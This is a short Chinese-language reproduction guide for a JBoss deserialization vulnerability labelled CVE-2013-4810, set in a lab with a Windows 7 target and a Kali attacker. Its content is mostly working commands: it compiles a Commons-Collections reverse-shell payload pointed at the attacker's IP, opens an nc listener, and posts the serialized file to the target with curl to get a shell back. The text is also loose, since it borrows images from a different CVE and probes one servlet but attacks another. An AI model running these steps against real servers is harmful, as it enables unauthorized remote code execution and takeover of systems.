---
title: （CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞
id: zhfly2983
---

# （CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

win7一台，ip为172.26.1.151（靶机，安装了java环境）

kali一台，ip为192.168.1.192(攻击机)

输入http://172.26.1.151:8080/invoker/EJBInvokerServle 返回如图（图片是CVE-2015-7501的图片。差不多就是这个意思。凑活看哈~），说明接口开发，存在反序列化漏洞

![image](../img/c5512da83d294f63918fbd8c260e0089.png)

进入kali攻击机，下载反序列化工具:[https://github.com/ianxtianxt/CVE-2015-7501/](https://github.com/ianxtianxt/CVE-2015-7501/)

解压完，进入到这个工具目录 ,执行命令:

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 
```

继续执行命令:

```
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 
```

新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444

这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令:

```
curl http://172.26.1.151:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser 
```

![image](../img/07d7c1977844ba20a10d937871c15cba.png)

打开nc界面，发现shell已经弹回来了

![image](../img/778060853ab56211b93d767fa8272659.png)